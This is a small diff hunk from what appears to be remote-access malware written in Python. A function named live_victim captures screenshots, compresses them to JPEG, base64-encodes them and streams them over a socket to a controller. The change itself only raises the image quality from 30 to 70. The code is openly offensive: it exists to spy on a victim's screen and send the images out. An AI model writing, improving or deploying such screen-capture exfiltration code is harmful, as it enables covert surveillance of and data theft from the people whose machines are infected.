@@ -55,7 +55,7 @@ def live_victim(client_socket):
             if ss.mode == "RGBA":
                 ss = ss.convert("RGB")
             b = io.BytesIO()
-            ss.save(b, format="JPEG", quality=30)
+            ss.save(b, format="JPEG", quality=70)
             b64 = base64.b64encode(b.getvalue()).decode()
             frame_data = f"LIVE_START\n{b64}\nLIVE_END".encode()
             client_socket.send(frame_data)
